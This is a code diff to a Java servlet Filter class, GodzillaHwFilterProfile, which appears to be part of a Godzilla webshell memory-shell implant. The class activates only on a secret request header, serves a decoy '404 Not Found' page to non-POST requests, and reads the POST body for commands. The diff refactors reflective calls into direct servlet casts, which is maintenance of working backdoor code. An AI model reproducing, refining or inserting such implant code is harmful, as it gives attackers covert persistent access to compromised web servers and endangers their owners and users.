@@ -57,12 +57,15 @@ public class GodzillaHwFilterProfile extends ClassLoader implements Filter {
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
-        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
-        String method = (String) request.getClass().getMethod("getMethod").invoke(request);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        PrintWriter writer = ((HttpServletResponse) response).getWriter();
+        String method = ((HttpServletRequest) request).getMethod();
         if (!"POST".equalsIgnoreCase(method)) {
             writer.write(style.replace("##style##", "404 Not Found"));
             writer.flush();
@@ -105,7 +108,7 @@ public class GodzillaHwFilterProfile extends ClassLoader implements Filter {
 
     @SuppressWarnings("all")
     private static String readBodyString(Object request) throws Exception {
-        java.io.BufferedReader reader = (java.io.BufferedReader) request.getClass().getMethod("getReader").invoke(request);
+        java.io.BufferedReader reader = ((HttpServletRequest) request).getReader();
         StringBuilder builder = new StringBuilder();
         String line;
         while ((line = reader.readLine()) != null) {
